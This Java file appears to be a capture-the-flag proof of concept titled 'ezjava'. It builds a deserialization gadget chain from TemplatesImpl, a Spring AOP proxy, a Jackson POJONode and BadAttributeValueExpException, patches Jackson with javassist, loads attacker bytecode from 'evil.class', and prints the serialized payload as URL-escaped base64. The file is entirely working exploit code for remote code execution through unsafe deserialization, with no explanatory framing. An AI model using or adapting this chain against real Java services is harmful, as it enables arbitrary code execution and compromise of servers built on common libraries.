package com.sbctf.ezjava;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class poc {
    static {
        try {
            // javassist 修改 BaseJsonNode
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.getCtClass("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            writeReplace.setBody("return $0;");
            ctClass.writeFile();
            ctClass.toClass();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void setFieldValue(Object obj, String field, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field1 = obj.getClass().getDeclaredField(field);
        field1.setAccessible(true);
        field1.set(obj, value);
    }

    //解决jackson链子不稳定的问题
    public static Object makeTemplatesImplAopProxy(Templates templates) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getDeclaredConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("evil.class"));
        byte[][] codes = {code};
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", codes);
        setFieldValue(templatesImpl, "_name", "aa");
        setFieldValue(templatesImpl, "_tfactory", null);
        POJONode pojoNode = new POJONode(makeTemplatesImplAopProxy(templatesImpl));
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        setFieldValue(badAttributeValueExpException, "val", pojoNode);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.close();
        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        System.out.println(base64String.replaceAll("\\+", "%2B"));
    }
}
